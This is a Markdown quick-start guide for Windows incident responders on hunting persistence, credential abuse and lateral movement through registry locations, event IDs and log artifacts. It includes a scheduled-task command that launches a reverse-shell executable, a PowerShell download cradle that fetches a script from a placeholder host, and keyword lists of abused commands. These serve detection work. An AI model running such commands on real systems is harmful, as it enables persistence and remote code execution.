# Host Analysis Quick Start


- [Host Analysis Quick Start](#host-analysis-quick-start)
	- [Malware Persitence Locations](#malware-persitence-locations)
		- [Common Autostart Locations (Hunting Artifact 🏹)](#common-autostart-locations-hunting-artifact-)
		- [Services (Hunting Artifact 🏹)](#services-hunting-artifact-)
		- [Scheduled Tasks (Hunting Artifact 🏹)](#scheduled-tasks-hunting-artifact-)
		- [DLL Hijacking (Hunting Artifact 🏹)](#dll-hijacking-hunting-artifact-)
		- [Hunting WMI Persistence (Hunting Artifact 🏹)](#hunting-wmi-persistence-hunting-artifact-)
	- [Common Malware Names (Hunting Artifact 🏹)](#common-malware-names-hunting-artifact-)
	- [Credential Theft Detection and Response](#credential-theft-detection-and-response)
		- [Detecting Credential Harvesting](#detecting-credential-harvesting)
	- [Event Logs Analysis](#event-logs-analysis)
		- [Event Log Summary (Hunting Artifact 🏹)](#event-log-summary-hunting-artifact-)
		- [Profiling Account Usage (Hunting Artifact 🏹)](#profiling-account-usage-hunting-artifact-)
		- [Brute Force Password Attack](#brute-force-password-attack)
		- [Built-In Accounts](#built-in-accounts)
		- [Tracking Administrator Account Activity (Hunting Artifact 🏹)](#tracking-administrator-account-activity-hunting-artifact-)
		- [Auditing Account Creation (Hunting Artifact 🏹)](#auditing-account-creation-hunting-artifact-)
		- [Remote Desktop Activity (Hunting Artifact 🏹)](#remote-desktop-activity-hunting-artifact-)
		- [Privileged Local Account Abuse - Pass the Hash](#privileged-local-account-abuse---pass-the-hash)
		- [Account and Group Enumeration](#account-and-group-enumeration)
		- [Lateral Movement - Network Shares (Hunting Artifact 🏹)](#lateral-movement---network-shares-hunting-artifact-)
		- [Lateral Movement - Explicit Credentials - runas (Hunting Artifact 🏹)](#lateral-movement---explicit-credentials---runas-hunting-artifact-)
		- [Lateral Movement - Scheduled Tasks](#lateral-movement---scheduled-tasks)
		- [Suspicious Services](#suspicious-services)
		- [Event Log Clearing](#event-log-clearing)
	- [Lateral Movement Tactics and Artifacts](#lateral-movement-tactics-and-artifacts)
		- [Auditing WMI Peristence (Hunting Artifact 🏹)](#auditing-wmi-peristence-hunting-artifact-)
		- [Quick Wins - WMI-Activity/Operational Log (Hunting Artifact 🏹)](#quick-wins---wmi-activityoperational-log-hunting-artifact-)
		- [Quick Wins - PowerShell (Hunting Artifact 🏹)](#quick-wins---powershell-hunting-artifact-)



## Malware Persitence Locations

- Most common areas of persistence (~98% of all persistence is captured in the first 6 steps)  
  - AutoStart Locations
  - Service Creation/Replacement
  - Service Failure Recovery
  - Scheduled Tasks
  - DLL Hijacking
  - WMI Event Consumers
  - More Advanced and Rare (Group Policy, MS Office Add-In, BIOS Flashing)


### Common Autostart Locations (Hunting Artifact 🏹)
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### Services (Hunting Artifact 🏹)
```
HKLM\SYSTEM\CurrentControlSet\Services
```
* 0x02 = Automatic
* 0x00 = Boot Start of a Device Driver
* "sc" command can create services


### Scheduled Tasks (Hunting Artifact 🏹)
- at.exe
	- Deprecated but present in WinXP and Win7+
	- Recorded in at.job files and schdlgu.txt (XP)
- schtasks.exe
	- Activitiy logged in Task Scheduler and Security Logs

```powershell
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe
```


### DLL Hijacking (Hunting Artifact 🏹)

Common DLL Search Order
1. DLLs already in memory
2. Side-by-side components
3. KnownDLLs List
4. Directory of the application
5. C:\Windows\System32
6. C:\Windows\System
7. C:\Windows
8. Current Directory
9. System %PATH%


### Hunting WMI Persistence (Hunting Artifact 🏹)
- Look at consumers (CommandLine and Active Script)
	- Correlate to Event Filter (trigger)
- Search
	- .exe
	- .vbs
	- .ps1
	- .dll
	- .eval
	- ActiveXObject
	- powershell
	- CommandLineTemplate
	- ScriptText
- Common WMI Occurences
	- SCM Event Log Consumer
	- BVTFilter
	- TSlogonEvents.vbs
	- TSLogonFilter
	- RAevent.vbs
	- RmAssistEventFilter
	- KernCap.vbs
	- NETEventLogConsumer
	- WSCEAA.exe (Dell)


## Common Malware Names (Hunting Artifact 🏹)
- [Online List of Common Malware Names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)
- [Local List of Common Malware Names](./files/common-malware-names/malware-names.md)


## Credential Theft Detection and Response

### Detecting Credential Harvesting
- Event Logs
	- 4624 Logons
	- 4720 Account Creation
	- 4776 Local Account Auth
	- 4672 Privileged Account Usage


## Event Logs Analysis



### Event Log Summary (Hunting Artifact 🏹)

| **Activity** | **Event Log** | **EID** |
| :---------------: | :---------------: | :---------------: |
|Logons|Security|4624, 4625, 4634, 4647,  4648, 4769, 4771, 4776|
|Account Logon|Security|4678, 4769, 4771, 4776|
|RDP|Security  RDPCoreTS  Terminal Services-RemoteConnectionManager|4624, 4625, 4778, 4779  131  1149|
|Network Shares|Security|5140-5145|
|Scheduled Tasks|Security  Task Scheduler|4698  106, 140-141, 200-201|
|Installation|Application|1033, 1034, 11707, 11708, 11724|
|Services|System  Security|7034-7036, 7040, 7045  4697|
|Log Clearing|Security  System|1102  104|
|Malware Execution|Security  System  Application|4688  1001  1000-1002|
|CommandLines|Security  PowerShell-Operational|4688  4103-4104|
|WMI|WMI-Activity-Operational|5857-5861|


**NOTE:** Refer to the [SANS Hunt Evil](./files/SANS_Hunt_Evil_Poster.pdf) Poster to more information on each of the EIDs above!


### Profiling Account Usage (Hunting Artifact 🏹)
- Determine which accounts have been used for attempted logons
- Track account usage for known compromised accounts

**Event IDs**
- 4624: Successful Logon
- 4625: Failed Logon
- 4634/4647: Successful Logoff
- 4648: Logon using explicit credentials (RunAs)
- 4672: Account logon with superuser rights (Administrator)
- 4720/4726: An account was created/deleted

**Notes**
- Windows does not reliably record logoffs, also look for 4647 -> user initiated logoff for interactive logons
- Logon events are not recorded when backdoors, remote exploits, or similar malicous means are used to access a system

**Logon Types**  
2: Logon via console (keyboard, server KVM, or virtual client)  
3: Network logon (SMB and some RDP connections)  
4: Batch Logon -- Often used by Scheduled tasks  
5: Windows Service Logon  
7: Credentials used to lock or unlock screen; RDP session reconnect  
8: Network logon sending credentials in cleartext  
9: Different credentials used than logged on user -- RunAs/netonly  
10: Remote interactive login (Remote Desktop Protocol)  
11: Cached credentials used to log on  
12: Cached Remote Interactive (similar to Type 10)  
13: Cached unlock (similar to Type 7)  

**Identify Logon Sessions**
- Use Logon ID value to link a logon with a logoff and determine session length
- Useful for interactive logons (Type 2, 10, 11, 12)
- Can tie togther actions like special user privileges assigned to the session, process tracking, and object access
- Admin logins generate two different sessions
	- high privilege session
	- lower privlege session


### Brute Force Password Attack
- Logon Type 3 - Could SMB or RDP
- 1 accounts and many passwords = password guessing attack
- many accounts and few passwords = password spraying attack



### Built-In Accounts

- SYSTEM
	- Most powerful local account; unlimited access to system

- LOCAL SERVICE
	- Limited privileges similar to authenticated user account; can access only network resources via null session

- NETWORK SERVICE
	- Slightly higher privileges that LOCAL SERVICE; can access network resouces similar to authenticated user account

- HOSTNAME$
	- Every domain-joined windows system has a computer account

- DWM
	- Desktop window manager\Window manager group

- UMFD
	- Font driver host account

- ANONYMOUS LOGON
	- Null session w/o credentials use to authenticate with resource

**Notes**  
- Recommended to ignore in initial investigation (very noisy)



### Tracking Administrator Account Activity (Hunting Artifact 🏹)

- Event ID 4672
- Usually follows Event ID 4624 (Successful Logon)
- Important for:
	- Account auditing
	- Planning for password resets
	- Identifying compromised service accounts
- Scheduled tasks run with administrative privileges also trigger this



### Auditing Account Creation (Hunting Artifact 🏹)

- Event ID 4720
- Complementary events include
	- 4722: A user account was enabled
	- 4724: An attempt was made to reset an accounts password
	- 4728: A member was added to a security enabled global group
	- 4732: A member was added to a security enabled local group
	- 4735: A security enabled local group was changed
	- 4738: A user account was changed
	- 4756: A member was added to a security enabled universal group



### Remote Desktop Activity (Hunting Artifact 🏹)

- Event ID 4778 (Session Reconnected)
	- Should see 4624 (Successful logon) simultaneously
	- Session name contains "RDP"
	- Client Name: True Client Hostname (regardless of hops)
- Event ID 4779 (Session Disconnected)
	- Should see 4647 (Successful logoff) simultaneously
- Not a reliable indicator of all RDP activity (records reconnects)
	- Fill in gaps with Event ID 4624 Type 3,7,10 Events
- Logs provide IP address and hostname
- False positive: Shared workstations (fast user switching)
	- Session Name: Console
- Source System
	- Security
		- 4648: Logon with alternate credentials
			- Current logged on username
			- Alternate user name
			- Destination hostname/ip
			- Process Name
	- TerminalServices-RdpClient
		- 1024
			- Destination hostname
		- 1102
			- Destination IP
- Destination System
	- Security
		- 4624 Type 10
			- Source IP/Logon Username
		4778/4779
			- IP address of source/source system name
			- Logon Username
	- Remote Desktop Services-RDPCoreTS
		- 131 - Connection attempts
			- Source ip/logon username
		- 98 - Successful connections
	- TerminalServices Remote Connection Manager
		- 1149
			- Source ip/logon user name
				- Blank may indicate use of sticky keys
	- Terminal Services LocalSession Manager
		- 21,22,25
			- Source IP, Logon username
		- 41
			- Logon Username
- 4624 Type 7
	- Often Unlock or RDP Reconnect


### Privileged Local Account Abuse - Pass the Hash

- Filter event logs for Event ID 4776 (exclude Domain Controllers)
- Identify any workstations with these events
- Note Source Workstation, if Source Workstation doesn't match source of log activity is taking place remotely
- Review events surrounding 4776
	- 4624 (succesful logon)
		- Type 3 often indicative of share mapping or exceuting code with PsExec
	- 4672 - Privelged logon
	- 5140 - File Share event



### Account and Group Enumeration

- Event ID 4798: A user's local group was enumerated
- Event ID 4799: A security-enabled local group membership was enumerated


### Lateral Movement - Network Shares (Hunting Artifact 🏹)

- Event Id 5140: Network share was accessed
- Event Id 5145: Share object accessed (detailed file share auditing)


### Lateral Movement - Explicit Credentials - runas (Hunting Artifact 🏹)

- Track credential chagne common during lateral movement
- Event Id: 4624 (Logon Type 9)
- Event Id: 4648 (Logon using explicit credentials)

**Notes**
- Changing credentials necessary to move from system to system
- Typically only admins and attacks juggle multiple credentials
- 4648 events log on the originating system and help to identify attacker lateral movement from that system
- Logged if explicit credentials are supplied (even if no account change)
- RDP connections using different credentials often log 4648 events on both systems

**Detection**
- Originating Host - Event Id 4648
	- Subject
		- Account Name: Intitial Account Name
	- Account Whose Credentials Were Used
		- Account Name: "run as" account name
	- Target Server
		- Target Server Name: Remote Target
- Target System - Event Id 5140
	- Account Name: Should match account name of "Account Whose Credentials Were Used" from orginating host 4648 log
	- Source Address: Source IP of originating host
	- Share Name: Share accessed (IPC$, etc)
	- Computer: Computer name of remote host

**Cobalt Strike - Make Token or Pass the hash**

- EventID 4624
	- Logon Type 9 (explicit credentials)
	- "Subject - Account Name" matches "New Logon - Account Name"
	- Note Process information



- EventId 4648 (explicit credentials)
	- "Subject - Account Name" mathces "Account Whose Credentials Were Used - Account Name"
	- Note Target Server Name



### Lateral Movement - Scheduled Tasks

- Log: Task Scheduler - Security
	- 106 - 4698 - Task Created
	- 140 - 4720 - Task Updated
	- 141 - 4699 - Task Deleted
- Task Scheduler
	- 200/201: Task Executed/Completed
- Security
	- 4700/4701: Task Enabled/Disabled

**Notes**
- Tasks can be executed locally and remotely
	- Remotely scheduled task also cause Logon (ID 4624) Type 3 events
- Attackers commonly delete scheduled tasks after execution
	- Hunt deleted tasks (rare)
- Tasks running executables from /Temp likey evil

**Task Scheduler Artifacts**
- XML Files
- Saved in:
	- \Windows\System32\Tasks
	- \Windows\SysWOW64\Tasks
- Includes:
	- Task Name
	- Registration date and time (local)
	- Account used to register
	- Trigger conditions and frequency
	- Full command path
	- Account authenticated to run task



### Suspicious Services

- Analyze logs for suspicious services running at boot time
	- Service type changed to Boot
- Review services started and stopped during time of a suspected hack



- System Log
	- 7034: Service Crashed Unexpectedly
	- 7035: Service sent a Start/Stop control
	- 7036: Service started or stopped
	- 7040: Start typed changed (Boot, On Request, Disabled)
	- 7045: A new service was installed on the system (Win2008R2+)
- Security Log
	- 4697: A new service was installed on the system



**Notes**
- A large amount of malware and worms in the wild utilize Services
- Services started on bot illustrate peristence
- Services can crash due to attacks like process injections



**Example - PsExec**
- Filter by 7045 (New service installed)
- Look for services not tied to Built-In accounts (SIDs)
- Everytime PsExec runs, it starts a brand new service
- Note service File Name



### Event Log Clearing
- 1102: Audit Log Cleared (Security)
- 104: Audit Log Cleared (System)


---


## Lateral Movement Tactics and Artifacts

- All lateral movement artifacts can be viewed from the [Hunt Evil Poster](./files/SANS_Hunt_Evil_Poster.pdf).

- The text based version is also listed [HERE](./files/Hunt_Evil_Extracted.md).


### Auditing WMI Peristence (Hunting Artifact 🏹)
- Easily audit for malicious WMI event consumer
- EID 5858 records query errors, including host and username
- EID 5857-5861 record filter/consumer
- EID 5861 is the most useful: new permanent event consumer creation

### Quick Wins - WMI-Activity/Operational Log (Hunting Artifact 🏹)
- EID 5861: New permanent consumers
- Create an WMI consumer allowlist
- WMIC commandlines in Process Tracking (Security Logs)
- EID 5857 tracks loaded provider dlls
- EID 5858 includes hostname and username
- Search for:
	- CommandLine
	- ActiveScript
	- scrcons
	- wbemcons
	- powershell
	- eval
	- .vbs
	- .ps1
	- ActiveXObject


### Quick Wins - PowerShell (Hunting Artifact 🏹)
- PowerShell/Operational Log
	- EID 4103 records module/pipeline output
	- EID 4104 record code (scripts) executed (look for "Warning" events)
- PowerShell download cradle heavily used in the wild
	- ```IEX (New-Object Net.WebClient).dowloadstring("http://bad.com/bad.ps1")```
- Filter using commonly abused keywords
	- download
	- IEX
	- rundll32
	- http
	- Start-Process
	- Invoke-Expression
	- Invoke-Command
	- syswow64
	- FromBase64String
	- WebClient
	- bitstransfer
	- Reflection
	- powershell -version
	- Invoke-WmiMethod
	- Invoke-CimMethod